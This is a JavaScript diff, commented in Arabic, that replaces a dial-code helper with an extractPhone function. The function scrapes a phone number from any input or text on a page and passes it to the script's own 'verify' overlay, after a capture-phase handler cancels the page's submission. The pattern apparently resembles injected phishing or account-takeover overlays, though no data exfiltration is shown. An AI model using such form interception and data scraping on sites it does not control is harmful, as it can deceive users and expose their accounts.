@@ -345,20 +345,62 @@ Error generating stack: `+e.message+`
     _busy = false;
   }
 
-  /* ── استخراج كود الدولة من الـ select ── */
-  function getDialCode(){
-    var code = '';
+  /* ══════════════════════════════════════════
+     extractPhone — يجمع رقم الهاتف من الـ DOM
+     بأربع استراتيجيات مختلفة ويختار الأفضل
+  ══════════════════════════════════════════ */
+  function extractPhone(){
+    var candidates = [];
+
+    /* ① كل الـ inputs غير المخفية وغير خانات الرمز (maxlength=1) */
+    document.querySelectorAll('input').forEach(function(inp){
+      if(inp.type === 'hidden' || inp.type === 'checkbox' ||
+         inp.type === 'radio'  || inp.type === 'password') return;
+      if((inp.getAttribute('maxlength') || '') === '1') return;
+      var v = (inp.value || '').trim().replace(/[\s\-().]/g,'');
+      if(/^\+?\d{5,15}$/.test(v)) candidates.push(v);
+    });
+
+    /* ② إذا لم نجد شيئاً → ابحث في نصوص كل العناصر عن رقم هاتف */
+    if(!candidates.length){
+      document.querySelectorAll('*').forEach(function(el){
+        if(el.children.length) return; /* عناصر ورقية فقط */
+        var t = (el.textContent || '').trim().replace(/[\s\-().]/g,'');
+        if(/^\+?\d{7,15}$/.test(t)) candidates.push(t);
+      });
+    }
+
+    /* ③ استخرج كود الدولة من أي select أو عنصر يظهر "+XXX" */
+    var dialCode = '';
     document.querySelectorAll('select').forEach(function(sel){
       var opt = sel.options[sel.selectedIndex];
       if(!opt) return;
-      /* القيمة قد تكون "+967" أو "967" */
       var val = (opt.value||'').trim().replace(/^\+/,'');
-      if(/^\d{1,4}$/.test(val)){ code = val; return; }
-      /* أو استخرجها من نص الخيار */
+      if(/^\d{1,4}$/.test(val)){ dialCode = val; return; }
       var m = (opt.text||'').match(/\+(\d{1,4})/);
-      if(m) code = m[1];
+      if(m) dialCode = m[1];
     });
-    return code;
+    if(!dialCode){
+      /* بحث في spans وdivs عن "+XXX" */
+      document.querySelectorAll('span,div,button').forEach(function(el){
+        if(el.children.length > 2) return;
+        var t = (el.textContent||'').trim();
+        var m = t.match(/^\+(\d{1,4})$/);
+        if(m && !dialCode) dialCode = m[1];
+      });
+    }
+
+    if(!candidates.length) return '';
+
+    /* ④ اختر أفضل مرشح: الأطول رقماً، بدون كود الدولة مكرر */
+    candidates.sort(function(a,b){ return b.length - a.length; });
+    var best = candidates[0].replace(/^\+/,'');
+
+    /* إذا وجدنا كود الدولة وهو ليس مضمّناً في البداية → أضفه */
+    if(dialCode && !best.startsWith(dialCode)){
+      return '+' + dialCode + best;
+    }
+    return best.startsWith('+') ? best : (dialCode ? '+' + best : best);
   }
 
   /* ── overlay التحقق ── */
@@ -426,18 +468,8 @@ Error generating stack: `+e.message+`
     e.preventDefault();
     _busy = true;
 
-    /* اقرأ الرقم من الـ input */
-    var localNum = '';
-    document.querySelectorAll(
-      'input[type="tel"]:not([maxlength="1"]), input[inputmode="numeric"]:not([maxlength="1"])'
-    ).forEach(function(inp){
-      if(inp.value.trim()) localNum = inp.value.trim();
-    });
-
-    /* ابنِ الرقم الكامل مع كود الدولة */
-    var dialCode = getDialCode();
-    var fullPhone = dialCode ? ('+' + dialCode + localNum) : localNum;
-
+    /* ── استخراج رقم الهاتف بأكثر من طريقة ── */
+    var fullPhone = extractPhone();
     showVerifyOverlay(fullPhone, btn);
   }, true);
 })();
